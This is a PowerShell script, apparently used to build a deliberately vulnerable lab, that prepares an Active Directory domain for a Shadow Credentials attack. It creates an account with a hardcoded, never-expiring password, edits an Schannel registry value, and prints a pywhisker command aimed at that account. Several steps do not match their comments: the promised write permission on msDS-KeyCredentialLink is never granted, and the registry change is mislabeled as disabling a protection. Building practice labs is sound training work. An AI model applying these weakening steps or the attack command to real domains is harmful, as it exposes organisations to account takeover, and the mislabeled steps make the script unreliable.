# vuln: shadow_credentials | severity: high
Write-Host "[VULN] Enabling Shadow Credentials attack surface..."
Import-Module ActiveDirectory -ErrorAction SilentlyContinue
# Ensure msDS-KeyCredentialLink is writable by low-priv users
try {
    $domain = Get-ADDomain
    $domainDN = $domain.DistinguishedName
    $lowPriv = Get-ADUser -Filter { SamAccountName -eq "j.morrison" } -ErrorAction SilentlyContinue
    if (-not $lowPriv) {
        $sec = ConvertTo-SecureString "Shadow@123" -AsPlainText -Force
        New-ADUser -Name "shadow_target" -SamAccountName "shadow_target" -AccountPassword $sec -Enabled $true -PasswordNeverExpires $true -ErrorAction SilentlyContinue
        Write-Host "[+] Created shadow_target / Shadow@123"
    }
    # Disable certificate-based authentication protection
    reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel" /v SendTrustedIssuerList /t REG_DWORD /d 0 /f
    Write-Host "[VULN] Shadow credentials attack surface configured."
    Write-Host "[INFO] Attack: pywhisker.py -d cyberstrike.mil -u attacker -p pass --target shadow_target --action add"
} catch { Write-Host "[!] $($_.Exception.Message)" }
